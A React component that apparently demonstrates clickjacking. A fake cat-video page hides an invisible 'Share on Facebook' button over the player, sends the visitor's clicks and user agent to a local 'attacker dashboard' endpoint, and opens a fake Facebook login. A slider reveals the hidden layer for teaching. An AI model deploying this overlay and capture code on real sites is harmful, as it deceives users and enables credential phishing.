'use client'

import { useState, useEffect } from 'react'
import { Play, ThumbsUp, Share2, MessageCircle } from 'lucide-react'

export default function SocialMediaVictim() {
  const [isAttackActive, setIsAttackActive] = useState(false)
  const [sessionId, setSessionId] = useState('')
  const [isLoading, setIsLoading] = useState(false)
  const [showSuccess, setShowSuccess] = useState(false)
  const [showSpam1, setShowSpam1] = useState(false)
  const [showSpam2, setShowSpam2] = useState(false)
  const [showSpam3, setShowSpam3] = useState(false)
  const [attackOpacity, setAttackOpacity] = useState(0)

  useEffect(() => {
    // Generate session ID on client side only
    const newSessionId = `victim-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`
    setSessionId(newSessionId)
    
    // Notify attacker dashboard that victim connected
    fetch('http://localhost:3001/api/capture', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: 'victim_connected',
        sessionId: newSessionId,
        data: {
          ip: 'Victim IP Hidden',
          userAgent: navigator.userAgent,
          scenario: 'social-media'
        }
      })
    }).catch(console.error)

    // Activate attack immediately - no delay
    setIsAttackActive(true)
  }, [])

  const handleVideoClick = async (e: React.MouseEvent<HTMLDivElement>) => {
    if (isLoading) return // Prevent multiple clicks
    
    const rect = e.currentTarget.getBoundingClientRect()
    const x = e.clientX - rect.left
    const y = e.clientY - rect.top
    
    // Send click data to attacker
    await fetch('http://localhost:3001/api/capture', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: 'click',
        sessionId,
        data: { x: Math.round(x), y: Math.round(y), scenario: 'social-media' }
      })
    }).catch(console.error)

    // Trigger hidden Facebook share
    const hiddenButton = document.getElementById('hidden-fb-share')
    if (hiddenButton) {
      hiddenButton.click()
    }
  }

  // Listen for message from fake Facebook when user completes action
  useEffect(() => {
    const handleMessage = (event: MessageEvent) => {
      if (event.data.type === 'facebook_success') {
        setIsLoading(false)
        setShowSuccess(true)
        setTimeout(() => setShowSuccess(false), 5000)
        
        // Show spam notifications with staggered timing
        setTimeout(() => setShowSpam1(true), 10000) // First spam after 10 seconds
        setTimeout(() => setShowSpam2(true), 20000) // Second spam after 20 seconds  
        setTimeout(() => setShowSpam3(true), 30000) // Third spam after 30 seconds
        
        // Hide spam notifications after showing
        setTimeout(() => setShowSpam1(false), 18000) // Hide first after 8 seconds of showing
        setTimeout(() => setShowSpam2(false), 28000) // Hide second after 8 seconds of showing
        setTimeout(() => setShowSpam3(false), 38000) // Hide third after 8 seconds of showing
      }
    }
    
    window.addEventListener('message', handleMessage)
    return () => window.removeEventListener('message', handleMessage)
  }, [])

  return (
    <div className="min-h-screen p-4">
      {/* Simple header */}
      <header className="max-w-4xl mx-auto mb-8">
        <h1 className="text-2xl font-bold text-gray-800">CatTube</h1>
        <p className="text-gray-600">Watch the funniest cat videos!</p>
      </header>

      <main className="max-w-4xl mx-auto">
        <div className="bg-white rounded-lg shadow-lg p-6">
          <h2 className="text-xl font-semibold mb-4">
            🍕 Cat Uses Zomato App to Order Pizza by Itself! (GONE WRONG)
          </h2>
          
          {/* Video Player Area */}
          <div 
            className="relative bg-black rounded-lg overflow-hidden cursor-pointer group"
            onClick={handleVideoClick}
            style={{ opacity: 1 - attackOpacity }}
          >
            <img 
              src="https://images.unsplash.com/photo-1514888286974-6c03e2ca1dba?w=800&h=450&fit=crop" 
              alt="Cat video thumbnail"
              className="w-full"
            />
            
            {/* Visible Play Button or Loading Spinner */}
            <div className="absolute inset-0 flex items-center justify-center">
              {isLoading ? (
                <div className="bg-white/90 rounded-full p-4">
                  <div className="w-8 h-8 border-4 border-red-600 border-t-transparent rounded-full animate-spin"></div>
                </div>
              ) : (
                <div className="bg-white/90 rounded-full p-4 group-hover:scale-110 transition-transform animate-bounce">
                  <Play size={32} className="text-red-600 ml-1" fill="#dc2626" />
                </div>
              )}
            </div>

            {/* Loading Text */}
            {isLoading && (
              <div className="absolute bottom-4 left-4 bg-black/70 text-white px-3 py-1 rounded-full text-sm">
                Loading video...
              </div>
            )}
          </div>
          
        </div>
        
        {/* Hidden Malicious Layer - Positioned over video area only */}
        {isAttackActive && (
          <div 
            className="absolute flex items-center justify-center" 
            style={{ 
              opacity: attackOpacity,
              pointerEvents: 'auto',
              zIndex: 9999,
              top: '120px', // Position over video area
              left: '50%',
              transform: 'translateX(-50%)',
              width: '800px',
              height: '450px'
            }}
          >
            <div className="bg-blue-600 text-white px-6 py-3 rounded-lg shadow-lg border-2 border-gray-300">
              <div className="flex items-center gap-2">
                <div className="w-6 h-6 bg-white rounded text-blue-600 flex items-center justify-center font-bold text-sm">f</div>
                <span className="font-semibold">Share on Facebook</span>
              </div>
              <div className="text-xs text-blue-100 mt-1">Click to share this video with friends</div>
            </div>
            
            <button
              id="hidden-fb-share"
              className="absolute inset-0 w-full h-full"
              onClick={(e) => {
                e.stopPropagation()
                // Simulate Facebook share
                console.log('MALICIOUS: Facebook share triggered!')
                
                // Send to attacker
                fetch('http://localhost:3001/api/capture', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    type: 'credentials',
                    sessionId,
                    data: {
                      field: 'facebook_share',
                      value: 'Get Rich Quick! 💰 Click here for INSTANT money!'
                    }
                  })
                }).catch(console.error)

                // Show loading state
                setIsLoading(true)
                
                // Redirect to fake Facebook login instead of real Facebook
                setTimeout(() => {
                  window.open(`/fake-facebook?session=${sessionId}`, '_blank')
                }, 1000)
              }}
            >
            </button>
          </div>
        )}
        
        <div>
          
          {/* Video Stats */}
          <div className="flex items-center justify-between mt-4 text-gray-600">
            <div className="flex items-center gap-4">
              <button className="flex items-center gap-1 hover:text-gray-900">
                <ThumbsUp size={20} />
                <span>2.3M</span>
              </button>
              <button className="flex items-center gap-1 hover:text-gray-900">
                <MessageCircle size={20} />
                <span>45K</span>
              </button>
              <button className="flex items-center gap-1 hover:text-gray-900">
                <Share2 size={20} />
                <span>Share</span>
              </button>
            </div>
            <span className="text-sm">2.5M views • 2 days ago</span>
          </div>
          
          {/* Description */}
          <div className="mt-6 pt-6 border-t">
            <h3 className="font-semibold mb-2">Description</h3>
            <p className="text-gray-700">
              Watch this hilarious cat accidentally order pizza using the Zomato app! 
              You won't believe what happens next... 😂🍕🐱
            </p>
            <p className="text-sm text-gray-500 mt-2">
              #cats #funny #viral #zomato #pizza
            </p>
          </div>
        </div>
      </main>

      {/* Clickjacking Demo Control Panel - Compact */}
      <div className="fixed top-4 left-4 bg-gray-800/90 text-white p-2 rounded border border-gray-500 z-50 text-xs max-w-48">
        <div className="flex items-center gap-2 mb-1">
          <span>⚙️</span>
          <span className="text-xs font-medium">Show Hidden Layer</span>
        </div>
        <input
          type="range"
          min="0"
          max="1"
          step="0.1"
          value={attackOpacity}
          onChange={(e) => setAttackOpacity(parseFloat(e.target.value))}
          className="w-full h-1 bg-gray-600 rounded appearance-none cursor-pointer"
        />
        <div className="flex justify-between text-xs text-gray-400 mt-1">
          <span>Hidden</span>
          <span>Visible</span>
        </div>
      </div>

      {/* Success Notification */}
      {showSuccess && (
        <div className="fixed top-4 right-4 bg-green-600 text-white p-4 rounded-lg shadow-lg z-50 max-w-sm">
          <div className="flex items-center gap-2 mb-2">
            <div className="w-2 h-2 bg-green-300 rounded-full"></div>
            <span className="font-semibold">Facebook</span>
          </div>
          <p className="text-sm">✅ Successfully shared to your timeline!</p>
          <p className="text-xs text-green-100 mt-1">Your friends can now see this amazing cat video!</p>
        </div>
      )}

      {/* Spam Notifications (show with staggered timing) */}
      {showSpam1 && (
        <div className="fixed top-20 right-4 bg-blue-600 text-white p-3 rounded shadow-lg z-40 max-w-xs animate-pulse">
          <p className="text-xs">💰 Sarah Johnson shared: "OMG! I just made $500 in 1 hour! Click here now!"</p>
        </div>
      )}
      
      {showSpam2 && (
        <div className="fixed top-36 right-4 bg-purple-600 text-white p-3 rounded shadow-lg z-40 max-w-xs animate-pulse">
          <p className="text-xs">🎁 Mark Wilson shared: "FREE IPHONE GIVEAWAY! Limited time only!"</p>
        </div>
      )}
      
      {showSpam3 && (
        <div className="fixed top-52 right-4 bg-red-600 text-white p-3 rounded shadow-lg z-40 max-w-xs animate-pulse">
          <p className="text-xs">⚠️ Lisa Chen shared: "Your account may be compromised! Verify now!"</p>
        </div>
      )}
      
      {/* Debug info - hidden in production */}
      {sessionId && (
        <div className="fixed bottom-4 right-4 bg-black/80 text-white text-xs p-2 rounded opacity-0 hover:opacity-100 transition-opacity">
          <div>Scenario: Social Media</div>
          <div>Session: {sessionId}</div>
          <div>Attack: {isAttackActive ? 'ACTIVE' : 'LOADING'}</div>
        </div>
      )}
    </div>
  )
}